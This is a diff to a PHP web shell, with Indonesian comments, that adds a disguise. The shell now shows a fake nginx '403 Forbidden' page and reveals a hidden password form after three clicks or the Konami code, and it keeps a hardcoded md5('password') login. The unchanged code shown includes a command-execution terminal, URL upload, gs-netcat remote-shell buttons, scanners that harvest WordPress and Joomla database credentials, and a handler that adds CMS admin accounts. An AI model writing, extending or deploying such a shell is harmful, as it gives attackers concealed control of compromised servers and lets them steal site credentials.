@@ -7,6 +7,213 @@ if (!ini_get('date.timezone')) {
     date_default_timezone_set('UTC');
 }
 session_start();
+// Password configuration - ganti password sesuai keinginan Anda
+$stored_password_hash = md5("password"); // ganti password
+// Authentication check
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    // Check if login form submitted
+    if (isset($_POST['login_password']) && md5($_POST['login_password']) === $stored_password_hash) {
+        $_SESSION['authenticated'] = true;
+        // Redirect to prevent form resubmission
+        header("Location: " . basename(__FILE__));
+        exit;
+    }
+    
+    // Check for special parameter to show login form
+    if (isset($_GET['auth']) && $_GET['auth'] === 'login') {
+        showLoginPage();
+        exit;
+    }
+    
+    // Show 403 Forbidden page
+    show403Page();
+    exit;
+}
+// Function to show 403 Forbidden page that looks like nginx
+function show403Page() {
+    ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>403 Forbidden</title>
+    <style>
+        body {
+            width: 35em;
+            margin: 0 auto;
+            font-family: Tahoma, Verdana, Arial, sans-serif;
+        }
+        .hidden-form {
+            display: none;
+            margin-top: 20px;
+            padding: 15px;
+            border: 1px solid #ddd;
+            background-color: #f9f9f9;
+            border-radius: 5px;
+        }
+        .hidden-form input[type="password"] {
+            width: 70%;
+            padding: 8px;
+            margin-right: 10px;
+        }
+        .hidden-form button {
+            padding: 8px 15px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+        }
+        .hidden-form button:hover {
+            background-color: #45a049;
+        }
+        .hint {
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <h1>403 Forbidden</h1>
+    <p>You don't have permission to access this resource.</p>
+    <hr>
+    <center id="nginx-text">nginx</center>
+    
+    <!-- Hidden form for authentication -->
+    <div class="hidden-form" id="authForm">
+        <form method="post" action="<?php echo basename(__FILE__); ?>">
+            <input type="password" name="login_password" id="passwordField" placeholder="Enter password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div class="hint">Click "nginx" 3 times to show login form</div>
+    </div>
+    
+    <script>
+        // Show login form when clicking on "nginx" text 3 times
+        let clickCount = 0;
+        document.getElementById('nginx-text').addEventListener('click', function() {
+            clickCount++;
+            if (clickCount >= 3) {
+                document.getElementById('authForm').style.display = 'block';
+                document.getElementById('passwordField').focus();
+                clickCount = 0;
+            }
+            
+            // Reset counter after 2 seconds
+            setTimeout(() => {
+                clickCount = 0;
+            }, 2000);
+        });
+        
+        // Alternative: Konami code
+        document.addEventListener('keydown', function(e) {
+            const konamiCode = [
+                'ArrowUp', 'ArrowUp', 'ArrowDown', 'ArrowDown',
+                'ArrowLeft', 'ArrowRight', 'ArrowLeft', 'ArrowRight',
+                'KeyB', 'KeyA'
+            ];
+            
+            if (typeof window.konamiIndex === 'undefined') {
+                window.konamiIndex = 0;
+            }
+            
+            if (e.code === konamiCode[window.konamiIndex]) {
+                window.konamiIndex++;
+                if (window.konamiIndex === konamiCode.length) {
+                    document.getElementById('authForm').style.display = 'block';
+                    document.getElementById('passwordField').focus();
+                    window.konamiIndex = 0;
+                }
+            } else {
+                window.konamiIndex = 0;
+            }
+        });
+    </script>
+</body>
+</html>
+    <?php
+    exit;
+}
+// Function to show login page
+function showLoginPage() {
+    ?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+            width: 320px;
+        }
+        .login-container h2 {
+            margin-top: 0;
+            text-align: center;
+            color: #333;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .login-form button {
+            width: 100%;
+            padding: 12px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .login-form button:hover {
+            background-color: #45a049;
+        }
+        .back-link {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .back-link a {
+            color: #666;
+            text-decoration: none;
+        }
+        .back-link a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <h2>Admin Login</h2>
+        <form method="post" action="<?php echo basename(__FILE__); ?>" class="login-form">
+            <input type="password" name="login_password" placeholder="Enter Password" required>
+            <button type="submit">Login</button>
+        </form>
+        <div class="back-link">
+            <a href="<?php echo basename(__FILE__); ?>">Back to 403 Page</a>
+        </div>
+    </div>
+</body>
+</html>
+    <?php
+    exit;
+}
 // Inisialisasi variabel penting
 $dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
 $msg = '';
@@ -28,9 +235,6 @@ $db_current_table = '';
 $table_structure = array();
 $total_rows = 0;
 $mode = isset($_GET['mode']) ? $_GET['mode'] : 'files';
-
-$stored_password_hash = md5("password"); // ganti password
-
 // === MYSQL EXTENSION COMPAT LAYER (mysqli first, then PDO fallback) ===
 if (!function_exists('mysql_connect')) {
     if (function_exists('mysqli_connect')) {
@@ -73,6 +277,9 @@ if (!function_exists('mysql_connect')) {
         function mysql_error($link=null) { 
             $ln=$link?:$GLOBALS['_mysql_last_link']; 
             return $ln?mysqli_error($ln):''; 
+        }
+        function mysql_free_result($result) { 
+            return @mysqli_free_result($result); 
         }
     } elseif (class_exists('PDO')) {
         // PDO emulation
@@ -147,9 +354,12 @@ if (!function_exists('mysql_connect')) {
             $err = $ln->errorInfo();
             return $err[2] ?? '';
         }
+        function mysql_free_result($result) {
+            // For PDO, we don't have a real resource to free, so just return true.
+            return true;
+        }
     }
 }
-
 // === UPLOAD FROM URL ===
 if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
     $url = trim($_POST['upload_url']);
@@ -172,7 +382,6 @@ if (isset($_POST['upload_url']) && $_POST['upload_url'] !== '') {
         }
     }
 }
-
 // === BYPASS BUTTONS HANDLER ===
 if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
     $url = trim($_POST['bypass_url']);
@@ -196,7 +405,6 @@ if (isset($_POST['bypass_fetch']) && isset($_POST['bypass_url'])) {
         }
     }
 }
-
 // === GS-NETCAT COMMAND BUTTONS ===
 if (isset($_POST['gs_cmd'])) {
     $cmdKey = $_POST['gs_cmd'];
@@ -214,7 +422,6 @@ if (isset($_POST['gs_cmd'])) {
         $gs_output = 'Unknown command key';
     }
 }
-
 // === CMS CONFIG PARSERS (FIXED) ===
 function parse_wp_config($file) {
     $r = array();
@@ -241,7 +448,6 @@ function parse_wp_config($file) {
     
     return $r;
 }
-
 function parse_joomla_config($file) {
     $r = array();
     if (!is_readable($file)) return $r;
@@ -257,7 +463,6 @@ function parse_joomla_config($file) {
     
     return $r;
 }
-
 // === CREATE ===
 if (!empty($_FILES['file']['name'])) {
     $target = $dir . "/" . basename($_FILES['file']['name']);
@@ -380,7 +585,6 @@ HT;
         $msg = '.htaccess created at ' . $target;
     }
 }
-
 // === SCAN DATABASE CONFIG (PHP 5 Compatible) ===
 function scan_configs($root, $maxFiles=2000, $maxBytes=262144, $opts=array()) {
     $root = realpath($root);
@@ -488,7 +692,6 @@ function scan_configs($root, $maxFiles=2000, $maxBytes=262144, $opts=array()) {
     $stats['unique_matches']=count($res);
     return array('err'=>null,'items'=>$res,'stats'=>$stats);
 }
-
 // === MINI SQL MANAGER (PHP 5 Compatible) ===
 function db_connect($host, $user, $pass, $db) {
     $conn = @mysql_connect($host, $user, $pass);
@@ -517,13 +720,15 @@ function db_get_tables($conn, $db) {
     while ($row = mysql_fetch_row($result)) {
         $tables[] = $row[0];
     }
+    mysql_free_result($result);
     return $tables;
 }
 function db_get_table_structure($conn, $table) {
     $result = mysql_query("DESCRIBE `$table`", $conn);
-    return db_fetch_all($result);
+    $structure = db_fetch_all($result);
+    mysql_free_result($result);
+    return $structure;
 }
-
 // === TERMINAL HELPERS ===
 function exec_cmd($cmd, $cwd) {
     $disabled = explode(',', str_replace(' ', '', ini_get('disable_functions')));
@@ -567,7 +772,6 @@ if (isset($_POST['cmd'])) {
     $cmd = trim($_POST['cmd']);
     $terminal_output = exec_cmd($cmd, $dir);
 }
-
 // === SCAN DATABASE CONFIG ===
 if (isset($_POST['scan_db'])) {
     $old_memory_limit = ini_get('memory_limit');
@@ -610,7 +814,6 @@ if (isset($_POST['apply_scan'])) {
         $db_error = 'Auto-connect failed: ' . mysql_error();
     }
 }
-
 // === MINI SQL MANAGER LOGIC ===
 if (isset($_SESSION['db_auto_switch']) && $_SESSION['db_auto_switch'] && isset($_SESSION['db_cred']) && !empty($_SESSION['db_cred'])) {
     $mode = 'sql';
@@ -793,7 +996,6 @@ if ($mode === 'sql') {
         if (isset($_SESSION['db_cred'])) unset($_SESSION['db_cred']);
     }
 }
-
 // === CMS ADMIN HANDLER (FIXED) ===
 if (isset($_POST['cms_get_config']) || isset($_POST['cms_add_admin']) || isset($_POST['cms_detect_prefix'])) {
     $cms_type = isset($_POST['cms_type']) ? $_POST['cms_type'] : '';
@@ -878,6 +1080,7 @@ if (isset($_POST['cms_get_config']) || isset($_POST['cms_add_admin']) || isset($
                             $cms_admin_msg .= ' (Auto-detected prefix: ' . $best_prefix . ')';
                         }
                     }
+                    mysql_free_result($res);
                     mysql_close($link);
                 }
             }
@@ -938,6 +1141,7 @@ if (isset($_POST['cms_get_config']) || isset($_POST['cms_add_admin']) || isset($
                             'Table Prefix: '.htmlspecialchars($prefix)."\n".
                             'CMS: WordPress';
                     }
+                    mysql_free_result($detailRes);
                 }
             } elseif ($cms_type === 'joomla') {
                 $users_table = $prefix . 'users';
@@ -980,6 +1184,7 @@ if (isset($_POST['cms_get_config']) || isset($_POST['cms_add_admin']) || isset($
                             'Table Prefix: '.htmlspecialchars($prefix)."\n".
                             'CMS: Joomla';
                     }
+                    mysql_free_result($detailRes);
                 }
             }
         }
@@ -1038,18 +1243,17 @@ if (isset($_POST['cms_get_config']) || isset($_POST['cms_add_admin']) || isset($
                         $cms_admin_msg = 'Multiple candidates: '.implode(', ', $cms_prefix_suggestions);
                     }
                 }
+                mysql_free_result($res);
             }
         }
     }
 }
-
 // === LOGOUT ===
 if (isset($_GET['logout']) && $_GET['logout'] == 1) {
     session_destroy();
     header("Location: " . basename(__FILE__));
     exit;
 }
-
 // === GET SYSTEM INFO ===
 $sys = array();
 $sys['php_version'] = phpversion();
